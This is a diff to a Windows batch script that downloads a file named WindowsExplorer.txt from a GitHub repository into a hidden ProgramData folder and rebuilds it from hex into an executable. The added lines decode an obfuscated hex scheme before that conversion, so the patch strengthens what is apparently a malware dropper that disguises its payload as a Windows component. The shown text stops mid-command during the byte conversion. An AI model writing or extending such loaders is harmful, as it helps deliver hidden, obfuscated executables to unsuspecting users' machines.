@@ -29,8 +29,10 @@ echo --------------------create-my-path-----------------------------------------
 mkdir "%systemdrive%\programdata\GG-Win"
 echo ----------------------------download-hex-file-------------------------------------
 PowerShell.exe -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/ibrahem1012/WindowsExplorer/raw/main/WindowsExplorer.txt','%programdata%\GG-Win\WindowsExplorer.txt')"
+echo ----------------------decode-obfuscated-hex----------------------------------------
+PowerShell.exe -Command "(Get-Content '%programdata%\GG-Win\WindowsExplorer.txt') -replace '\$', '0' -replace '\^', '1' -replace '#', '4' | Out-File '%programdata%\GG-Win\decoded_hex.txt' -Encoding ASCII"
 echo ----------------------convert-hex-to-exe-----------------------------------------
-PowerShell.exe -Command "Get-Content '%programdata%\GG-Win\WindowsExplorer.txt' | ForEach-Object { $_ -replace '[^0-9A-Fa-f]', '' } | Out-File '%programdata%\GG-Win\clean_hex.txt' -Encoding ASCII"
+PowerShell.exe -Command "Get-Content '%programdata%\GG-Win\decoded_hex.txt' | ForEach-Object { $_ -replace '[^0-9A-Fa-f]', '' } | Out-File '%programdata%\GG-Win\clean_hex.txt' -Encoding ASCII"
 PowerShell.exe -Command ^
 "$hex = Get-Content '%programdata%\GG-Win\clean_hex.txt' -Raw; ^
 $bytes = for ($i = 0; $i -lt $hex.Length; $i += 2) { [Convert]::ToByte($hex.Substring($i,2),16) }; ^
